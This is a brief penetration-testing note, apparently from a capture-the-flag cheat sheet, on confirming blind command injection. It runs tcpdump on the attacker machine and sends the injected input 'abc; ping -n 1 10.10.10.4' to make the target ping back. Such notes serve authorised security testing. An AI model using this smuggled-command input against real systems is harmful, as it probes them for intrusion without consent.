# General

* Listen for incoming connections, on attacker machine

        sudo tcpdump -i tun0

    Try pinging from remote machine to see if attacker machine is reachable

        abc; ping -n 1 10.10.10.4 
